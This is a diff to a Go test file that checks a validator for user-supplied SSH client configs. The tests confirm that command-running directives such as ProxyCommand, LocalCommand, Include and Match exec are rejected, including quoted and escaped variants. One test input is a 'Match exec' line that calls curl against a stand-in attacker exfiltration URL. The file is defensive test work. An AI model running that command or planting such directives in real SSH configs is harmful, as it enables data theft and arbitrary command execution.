@@ -9,6 +9,25 @@ import (
 	. "github.com/onsi/gomega"
 )
 
+const jumphostSSHConfig = `Host bastion
+  HostName bastion.example.com
+  User jump
+  Port 22
+  IdentityFile /tmp/master_key
+  IdentitiesOnly yes
+  PubkeyAuthentication yes
+  PreferredAuthentications publickey
+  StrictHostKeyChecking no
+  UserKnownHostsFile /dev/null
+  GlobalKnownHostsFile /dev/null
+  BatchMode yes
+  ConnectTimeout 30
+  ConnectionAttempts 1
+  ServerAliveInterval 30
+  ServerAliveCountMax 3
+Host target
+  ProxyJump bastion`
+
 var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 
 	// This section tests the parsePlatformList helper function
@@ -563,7 +582,9 @@ var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 				Entry("when the field is empty", "", ""),
 				Entry("when the field is whitespace", "   ", ""),
 				Entry("when the field contains an SSH client config", "  Host *\n  ProxyJump bastion.example.com\n", "Host *\n  ProxyJump bastion.example.com"),
-				Entry("when a comment mentions a forbidden directive", "# ProxyCommand is documented only\nHost *\n  ProxyJump bastion\n", "# ProxyCommand is documented only\nHost *\n  ProxyJump bastion"),
+				Entry("when a comment mentions a rejected directive", "# ProxyCommand is documented only\nHost *\n  ProxyJump bastion\n", "# ProxyCommand is documented only\nHost *\n  ProxyJump bastion"),
+				Entry("when a quoted allowed directive is unwrapped", "\"ProxyJump\" bastion.example.com\n", "\"ProxyJump\" bastion.example.com"),
+				Entry("when the field is a jumphost client config", jumphostSSHConfig+"\n", jumphostSSHConfig),
 			)
 		})
 
@@ -612,43 +633,59 @@ var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 				),
 				Entry("for ssh-config with ProxyCommand",
 					map[string]string{"ssh-config": "Host *\n  ProxyCommand ssh bastion -W %h:%p\n"},
-					`forbidden directive "proxycommand"`,
+					`ssh-config directive "proxycommand" is not allowed`,
+				),
+				Entry("for ssh-config with a quoted ProxyCommand",
+					map[string]string{"ssh-config": "\"ProxyCommand\" ssh bastion -W %h:%p\n"},
+					`ssh-config directive "proxycommand" is not allowed`,
 				),
 				Entry("for ssh-config with ProxyCommand in keyword=value form",
 					map[string]string{"ssh-config": "ProxyCommand=ssh bastion -W %h:%p\n"},
-					`forbidden directive "proxycommand"`,
+					`ssh-config directive "proxycommand" is not allowed`,
 				),
 				Entry("for ssh-config with LocalCommand",
 					map[string]string{"ssh-config": "Host *\n  LocalCommand echo hi\n"},
-					`forbidden directive "localcommand"`,
+					`ssh-config directive "localcommand" is not allowed`,
 				),
 				Entry("for ssh-config with PermitLocalCommand",
 					map[string]string{"ssh-config": "Host *\n  PermitLocalCommand yes\n"},
-					`forbidden directive "permitlocalcommand"`,
+					`ssh-config directive "permitlocalcommand" is not allowed`,
 				),
 				Entry("for ssh-config with Match exec",
 					map[string]string{"ssh-config": "Match exec \"curl http://attacker/exfil\"\n"},
-					`forbidden directive "match"`,
+					`ssh-config directive "match" is not allowed`,
 				),
 				Entry("for ssh-config with Match host",
 					map[string]string{"ssh-config": "Match host *.example.com\n  ProxyJump bastion\n"},
-					`forbidden directive "match"`,
+					`ssh-config directive "match" is not allowed`,
 				),
 				Entry("for ssh-config with KnownHostsCommand",
 					map[string]string{"ssh-config": "Host *\n  KnownHostsCommand /usr/bin/true\n"},
-					`forbidden directive "knownhostscommand"`,
+					`ssh-config directive "knownhostscommand" is not allowed`,
 				),
 				Entry("for ssh-config with Include",
 					map[string]string{"ssh-config": "Include /tmp/extra-ssh-config\n"},
-					`forbidden directive "include"`,
+					`ssh-config directive "include" is not allowed`,
 				),
 				Entry("for ssh-config with PKCS11Provider",
 					map[string]string{"ssh-config": "Host *\n  PKCS11Provider /usr/lib/pkcs11.so\n"},
-					`forbidden directive "pkcs11provider"`,
+					`ssh-config directive "pkcs11provider" is not allowed`,
 				),
 				Entry("for ssh-config with SecurityKeyProvider",
 					map[string]string{"ssh-config": "Host *\n  SecurityKeyProvider /usr/lib/sk-lib.so\n"},
-					`forbidden directive "securitykeyprovider"`,
+					`ssh-config directive "securitykeyprovider" is not allowed`,
+				),
+				Entry("for ssh-config with a port forward",
+					map[string]string{"ssh-config": "Host *\n  LocalForward 8080 localhost:8080\n"},
+					`ssh-config directive "localforward" is not allowed`,
+				),
+				Entry("for ssh-config with an escaped directive",
+					map[string]string{"ssh-config": "Proxy\\Command ssh bastion -W %h:%p\n"},
+					`ssh-config directive "Proxy\\Command" is not allowed`,
+				),
+				Entry("for ssh-config with an unclosed quote",
+					map[string]string{"ssh-config": "\"ProxyJump bastion.example.com\n"},
+					`ssh-config directive "\"ProxyJump" is not allowed`,
 				),
 			)
 		})
